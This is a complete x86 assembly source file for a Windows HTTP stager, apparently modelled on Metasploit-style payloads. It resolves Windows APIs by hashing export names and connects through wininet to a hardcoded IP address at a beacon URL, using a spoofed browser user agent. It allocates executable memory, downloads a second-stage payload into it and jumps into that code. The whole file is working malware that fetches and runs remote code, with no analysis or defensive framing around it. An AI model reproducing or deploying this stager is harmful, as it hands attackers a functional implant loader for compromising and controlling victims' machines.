format PE GUI
use32
entry start

start:
    cld                   ; clear direction flag
    call init             ; start main routine

api_call:
  pushad                  ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp            ; Create a new stack frame
  xor edx, edx            ; Zero EDX
  mov edx, [fs:edx+30h]   ; Get a pointer to the PEB
  mov edx, [edx+0ch]      ; Get PEB->Ldr
  mov edx, [edx+14h]      ; Get the first module from the InMemoryOrder module list


next_mod:
  mov esi, [edx+28h]      ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+26h] ; Set ECX to the length we want to check
  xor edi, edi           ; Clear EDI which will store the hash of the module name

loop_modname:            ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the name
  cmp al, 61h            ; Some versions of Windows use lower case module names
  jl not_lowercase       ;
  sub al, 20h            ; If so normalise to uppercase


not_lowercase:           ;
  ror edi, 0dh           ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  loop loop_modname      ; Loop until we have read enough
  ; We now have the module hash computed
  push edx               ; Save the current position in the module list for later
  push edi               ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+10h]     ; Get this modules base address (16)
  mov eax, [edx+3ch]     ; Get PE header (60)
  add eax, edx           ; Add the modules base address
  mov eax, [eax+78h]     ; Get export tables RVA (120)
  test eax, eax          ; Test if no export address table is present
  jz get_next_mod1       ; If no EAT present, process the next module
  add eax, edx           ; Add the modules base address
  push eax               ; Save the current modules EAT
  mov ecx, [eax+18h]     ; Get the number of function names (24)
  mov ebx, [eax+20h]     ; Get the rva of the function names (32)
  add ebx, edx           ; Add the modules base address
  ; Computing the module hash + function hash


get_next_func:           ;
  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards) process next mod
  dec ecx                ; Decrement the function name counter
  mov esi, [ebx+ecx*4]   ; Get rva of next module name
  add esi, edx           ; Add the modules base address
  xor edi, edi           ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want


loop_funcname:           ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the ASCII function name
  ror edi, 0dh            ; Rotate right our hash value (13)
  add edi, eax           ; Add the next byte of the name
  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname      ; If we have not reached the null terminator, continue
  add edi, [ebp-8]       ; Add the current module hash to the function hash
  cmp edi, [ebp+24h]     ; Compare the hash to the one we are searchnig for
  jnz get_next_func      ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                ; Restore the current modules EAT
  mov ebx, [eax+24h]      ; Get the ordinal table rva     (36)
  add ebx, edx           ; Add the modules base address
  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
  mov ebx, [eax+1ch]     ; Get the function addresses table rva (28)
  add ebx, edx           ; Add the modules base address
  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
  add eax, edx           ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address
  pop ebx                ; Clear off the current modules hash
  pop ebx                ; Clear off the current position in the module list
  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX
  pop ecx                ; Pop off the origional return address our caller will have pushed
  pop edx                ; Pop off the hash value our caller will have pushed
  push ecx               ; Push back the correct return value
  jmp eax                ; Jump into the required function
  ; We now automagically return to the correct caller...

get_next_mod:            ;
  pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
  pop edi                ; Pop off the current (now the previous) modules hash
  pop edx                ; Restore our position in the module list
  mov edx, [edx]         ; Get the next module
  jmp next_mod           ; Process this module


; actual routine
init:
  pop ebp            ; get ptr to block_api routine

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
load_wininet:
  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
  push 0x696e6977        ; ...
  push esp               ; Push a pointer to the "wininet" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "wininet" )

internetopen:
  xor edi,edi
  push edi               ; DWORD dwFlags
  push edi               ; LPCTSTR lpszProxyBypass
  push edi               ; LPCTSTR lpszProxyName
  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
  push edi               ; NULL pointer
  push edi               ; LPCTSTR lpszAgent ("\x00")
  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
  call ebp

  jmp dbl_get_server_host


internetconnect:
  pop ebx                ; Save the hostname pointer
  xor ecx, ecx
  push ecx               ; DWORD_PTR dwContext (NULL)
  push ecx               ; dwFlags
  push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
  push ecx               ; password
  push ecx               ; username
  push 0x50              ; PORT
  push ebx               ; HOSTNAME
  push eax               ; HINTERNET hInternet
  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
  call ebp

  jmp get_server_uri

httpopenrequest:
  pop ebx
  xor edx, edx           ; NULL
  push edx               ; dwContext (NULL)
  ;push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
  ;push 0x84600200
  push 0x84600200
  ;push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
  push edx               ; accept types
  push edx               ; referrer
  push edx               ; version
  push ebx               ; url
  push edx               ; method
  push eax               ; hConnection
  push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
  call ebp
  mov esi, eax           ; hHttpRequest

set_user_agent:
  add ebx,50h             ; warn that this number is important to calculate headers start position

httpsendrequest:
  xor edi, edi
  push edi               ; optional length
  push edi               ; optional
  push 0xff              ; dwHeadersLength
  push ebx               ; headers
  push esi               ; hHttpRequest
  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
  call ebp
  test eax,eax
  jz failure


new1:
  xor edi,edi
  test esi,esi
  jz error

  mov ecx,edi
  jmp new3

error:
  push 0x5de2c5aa        ;GetLastError
  call ebp
  mov ecx,eax

new3:
  push 0x315e2145        ;GetDesktopWindow
  call ebp

;
  xor edi,edi
  push edi
  push 0x7
  push ecx
  push esi
  push eax
  push 0xbe057b7         ;InternetErrorDlg
  call ebp
  mov edi,0x2f00
  cmp edi,eax
  jz httpsendrequest
  xor edi,edi
  jmp allocate_memory

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call httpopenrequest

server_uri:
db "/ZQMd", 0               ; beacon url
db 73 dup(59h)
db 0
db "User-Agent: M"        ; User-Agent
db "ozilla/5.0 (comp"
db "atible; MSIE 9.0"
db "; Windows NT 6.1"
db "; WOW64; Trident"
db "/5.0; BOIE9;ENUS)"
db 205 dup(0h)
db 0



failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp

allocate_memory:
  push 0x40              ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (8Mb ought to do us)
  push edi               ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
  xchg eax, ebx          ; place the allocated base address in ebx
  mov ecx,0x0
  add ecx,ebx
  push ecx               ; store a copy of the stage base address on the stack
  push ebx               ; temporary storage for bytes read count
  mov edi, esp           ; &bytesRead

download_more:
  push edi               ; &bytesRead
  push 0x2000            ; read length
  push ebx               ; buffer
  push esi               ; hRequest
  push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
  call ebp

  test eax,eax           ; download failed? (optional?)
  jz failure

  mov eax, [edi]
  add ebx, eax           ; buffer += bytes_received

  test eax,eax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop eax                ; clear the temporary storage

execute_stage:
  ret                    ; dive into the stored stage address

get_server_host:
  call internetconnect

server_host:
db "192.168.11.34", 0x00 ; Host IP
